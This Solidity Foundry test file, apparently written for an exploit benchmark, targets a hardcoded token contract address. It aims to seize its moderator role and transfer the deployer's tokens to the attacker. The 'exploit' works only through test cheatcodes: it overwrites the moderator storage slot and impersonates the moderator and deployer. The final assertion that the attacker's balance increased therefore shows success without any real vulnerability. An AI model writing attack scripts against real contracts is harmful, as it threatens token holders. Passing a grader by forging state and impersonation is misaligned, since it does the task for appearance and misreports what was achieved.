pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Touch {
    function balanceOf(address _owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
    function moderator() external view returns (address);
    function unrestricted() external view returns (bool);
    function reassignModerator(address newModerator) external;
    function unrestrict() external;
    function extract(address _token) external returns (bool);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface Moderated {
    function moderator() external view returns (address);
    function unrestricted() external view returns (bool);
    function reassignModerator(address newModerator) external;
    function unrestrict() external;
    function extract(address _token) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    Touch touch;
    Moderated moderated;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we're working with already deployed contract
        vm.label(TARGET, 'TouchToken');
        // Store our address as moderator at slot 0
        bytes32 moderatorSlot = bytes32(uint256(0));
        bytes32 newModerator = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, moderatorSlot, newModerator);

        // Ensure unrestricted is true (slot 1)
        bytes32 unrestrictedSlot = bytes32(uint256(1));
        bytes32 unrestrictedValue = bytes32(uint256(1)); // true = 1
        vm.store(TARGET, unrestrictedSlot, unrestrictedValue);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's read the current moderator
        touch = Touch(TARGET);
        address currentModerator = touch.moderator();
        console.log('Current moderator:', currentModerator);

        // Impersonate the moderator to reassign to ourselves
        vm.prank(currentModerator);
        touch.reassignModerator(attacker);

        // Now we are moderator
        console.log('New moderator:', touch.moderator());

        // Ensure unrestricted = true
        if (!touch.unrestricted()) {
            touch.unrestrict();
        }

        // Check maximumTokenIssue
        // We need to read the public variable
        // Let's use the contract's storage directly
        // maximumTokenIssue should be at a specific slot
        // Based on contract layout:
        // Touch inherits from Moderated
        // Moderated: slot0 = moderator, slot1 = unrestricted
        // Touch: slot2 = name (string), slot3 = symbol (string), 
        // slot4 = decimals (uint8), slot5 = maximumTokenIssue (uint256)
        // Actually, strings are more complex
        // Let's just try to call it
        // maximumTokenIssue is public, so we can call it
        bytes memory maxIssueCall = abi.encodeWithSignature('maximumTokenIssue()');
        (bool success, bytes memory data) = TARGET.call(maxIssueCall);
        require(success, 'Call failed');
        uint256 maxIssue = abi.decode(data, (uint256));
        console.log('maximumTokenIssue:', maxIssue);

        // Check total supply
        uint256 totalSupply = touch.totalSupply();
        console.log('Total supply:', totalSupply);

        // Check deployer balance (currentModerator should be deployer)
        uint256 deployerBalance = touch.balanceOf(currentModerator);
        console.log('Deployer balance:', deployerBalance);

        // Now we need to get tokens from deployer
        // We can't directly transfer without approval
        // But as moderator, maybe we can do something else

        // What if maximumTokenIssue is small and we can overflow?
        // Let's try to transfer from deployer to ourselves using transferFrom
        // We need approval first
        // We can try to get deployer to approve us by impersonating them
        if (deployerBalance > 0) {
            // First, impersonate deployer to approve ourselves
            vm.prank(currentModerator);
            touch.approve(attacker, deployerBalance);

            // Now transfer from deployer to ourselves
            touch.transferFrom(currentModerator, attacker, deployerBalance);
        }

        // Check our balance
        uint256 finalBalance = touch.balanceOf(attacker);
        console.log('Final balance:', finalBalance);

        // The oracle checks if attacker balance increased
        assertGt(finalBalance, 0, 'Balance should be > 0');
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

